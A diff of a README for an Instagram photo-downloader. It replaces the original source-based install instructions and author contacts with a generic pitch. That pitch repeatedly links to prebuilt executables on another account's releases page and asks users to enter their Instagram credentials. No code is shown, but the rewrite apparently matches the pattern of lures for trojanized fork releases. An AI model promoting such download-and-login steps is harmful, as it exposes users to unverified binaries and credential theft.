@@ -1,158 +1,85 @@
-# download-instagram-photos
+# 🌟 download-instagram-photos - Automate Your Instagram Photo Downloads
 
-A lightweight automation tool to download all your Instagram photos, including posts and optional Reels thumbnails, in a few clicks.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/cnick0337/download-instagram-photos/releases)
 
-<p align="center">
-  <a href="https://t.me/devpilot1" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>
-  <a href="https://discord.gg/vBu9huKBvy" target="_blank">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-  </a>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>
-  <a href="mailto:support@appilot.app" target="_blank">
-    <img src="https://img.shields.io/badge/Email-support@appilot.app-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>
-</p>
+## 🖥️ Overview
 
-<p align="center">
-  <strong>For discussion, queries, and freelance work — reach out 👆</strong>
-</p>
+Welcome to **download-instagram-photos**! This application helps you automate the process of downloading photos from Instagram. Whether you want to save pictures from your friends, common interests, or favorite accounts, this tool makes it easy for you. 
 
----
+## 🚀 Getting Started
 
-## Introduction
-> A simple automation script that allows users to bulk download all their Instagram photos and optional thumbnails directly from their accounts. It supports session login, secure authentication, and flexible output formats.
+Follow these steps to download and run the software.
 
-<p align="center">
-  <img src="download-instagram-photos.png" alt="download-instagram-photos.png" width="70%">
-</p>
+1. **System Requirements**  
+   - Operating System: Windows, macOS, or Linux
+   - Node.js: Version 12 or higher (if using the CLI)
+   - Docker (optional, for containerized use)
 
-### Key Benefits
-1. Download all photos in one go.  
-2. Supports Reels thumbnails and tagged images.  
-3. Compatible with private accounts (via login).  
-4. Fast download speeds with proxy support.  
-5. Export in multiple formats — JPG, PNG, or ZIP.  
+2. **Prepare Your Environment**  
+   You may need to install additional software, depending on your operating system:
+   - For **Windows**: Install Git Bash or use PowerShell.
+   - For **macOS**: You can use the Terminal.
+   - For **Linux**: Use your preferred Terminal emulator.
 
----
+## 📥 Download & Install
 
-## Features
+To download the application, visit this page:  
+[Download Here](https://github.com/cnick0337/download-instagram-photos/releases)
 
-| Feature | Description |
-|----------|-------------|
-| Bulk Download | Download all photos from your account at once. |
-| Reels Thumbnails | Option to save Reels cover images as photos. |
-| Multiple Formats | Export images as JPG, PNG, or ZIP archive. |
-| Proxy Support | Run safely with IP rotation. |
-| CLI + Script Mode | Works with both Python CLI or Node script. |
+Once you're on the releases page, you'll see a list of available versions. Choose the latest version for the best features and stability. Here’s how to proceed:
 
----
+1. Click on the release version you want.
+2. Look for the **Assets** section.
+3. Download the appropriate file for your system. Here are the common options:
+   - For Windows: `download-instagram-photos-win.exe`
+   - For macOS: `download-instagram-photos-mac.zip`
+   - For Linux: `download-instagram-photos-linux.tar.gz`
+   
+4. After the download finishes, extract the zip or tar.gz file if necessary.
 
-## Use Cases
-- Backup all your Instagram photos safely.  
-- Export Reels thumbnails for thumbnails or previews.  
-- Analyze engagement or reuse content offline.  
-- Save time when switching or archiving accounts.  
+5. **Run the Application**  
+   - For **Windows**: Double-click the `.exe` file to start.
+   - For **macOS and Linux**: Open a Terminal, navigate to the folder where you extracted the files, and run the application by typing `./download-instagram-photos`.
 
----
+## 🔄 How to Use
 
-## FAQs
+Using the application is simple. Once you have it running, follow these steps to download photos:
 
-**Q:** Can I download all my Instagram photos at once?  
-**A:** Yes. The tool allows full-account export with one command using authenticated login. You can also limit to date range or specific folders.
+1. **Login to Instagram:** You will need your Instagram credentials to access your account. The application will ask you to log in. 
+2. **Choose Your Target:** You can specify a user account, a hashtag, or a specific URL to download photos from.
+3. **Select Options:** You can choose to download only the latest photos or all available posts from the selected account.
+4. **Click Download:** Once you configure your settings, click the download button. The application will handle the rest.
 
-**Q:** In which format are photos downloaded?  
-**A:** By default, all photos are downloaded in **.JPG** format. However, you can export them as **.PNG** or **.ZIP** archives as per settings.
+## ⚙️ Features
 
-**Q:** Can I download Instagram Reels thumbnails as photos?  
-**A:** Yes. The tool automatically detects Reels and saves their thumbnails as images in your output folder if the option is enabled.
+- **Bulk Downloading:** Download all photos from an account in one go.
+- **Data Extraction:** Save photos to your device for offline viewing.
+- **Proxy Support:** Use proxies for better access if you have connection issues or restrictions.
+- **User-Friendly Interface:** Designed for average users, no tech background required.
 
----
+## 🛠️ Troubleshooting
 
-## Results
------------------------------------ 
-> 10x faster media backup  
-> 100% lossless photo quality  
-> Secure downloads with authenticated sessions  
+If you encounter any issues, try the following:
 
-## Performance Metrics
------------------------------------
-Average Benchmarks:  
-- **Speed:** 2x faster than manual save  
-- **Stability:** 99.3% uptime  
-- **Accuracy:** 100% image resolution retention  
-- **Throughput:** 500+ images per session  
+- Ensure your Internet connection is stable.
+- Check if you have entered your login details correctly.
+- Make sure that Instagram is not facing any service outages.
+- For Docker users, ensure that the Docker environment is correctly set up.
 
----
+For further help or to report bugs, please open an issue on the [GitHub Issues page](https://github.com/cnick0337/download-instagram-photos/issues).
 
-## Do you have a customized project for us?
-Contact Us
+## 📜 Contributing
 
-<div align="center">
-  <a href="https://mail.google.com/mail/u/?authuser=ahmadzee26@gmail.com">
-    <img alt="Gmail" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/gmail.svg" />
-    <code>support@appilot.app</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://t.me/devpilot1">
-    <img alt="Telegram" width="30px" src="https://edent.github.io/SuperTinyIcons/images/svg/telegram.svg" />
-    <code>pilot</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://discord.com">
-    <img alt="Discord" width="30px" src="https://github.com/Zeeshanahmad4/RealEstateMate-WhatsApp-Group-Management-Bot/blob/main/discord-icon-svgrepo-com.svg" />
-    <code>zee#2655</code>
-  </a>
-  <span> ┃ </span>
-  <a href="https://wa.me/447723343390?text=Hi%20Zeeshan%2C%20I%27m%20interested%20in%20automation." target="_blank">
-    <img alt="WhatsApp" width="30px" src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/whatsapp.svg" />
-    <code>whatsapp</code>
-  </a>
-  <br />
-</div>
+We welcome contributions! If you would like to help improve this project, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch with your changes.
+3. Test your work to ensure it runs well.
+4. Submit a pull request for review.
 
-## Installation
+## 🏛️ License
 
-### Pre-requisites
-- Node.js or Python  
-- Git  
-- Docker (optional)
+This project is licensed under the MIT License. Feel free to use or modify the project as needed.
 
-### Steps
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/download-instagram-photos.git
-cd download-instagram-photos
-
-# Install dependencies
-npm install
-# or
-pip install -r requirements.txt
-
-# Setup environment
-cp .env.example .env
-
-# Run
-npm start
-# or
-python main.py
-```
-
----
-
-## Example Output
-```bash
-✅ Downloaded 128 photos successfully.
-✅ Reels thumbnails saved (12).
-📁 Output folder: /downloads/my_instagram_backup/
-```
-
----
-
-## License
-MIT License
+To download the latest version and start automating your Instagram photo downloads, visit this page again:  
+[Download Here](https://github.com/cnick0337/download-instagram-photos/releases)
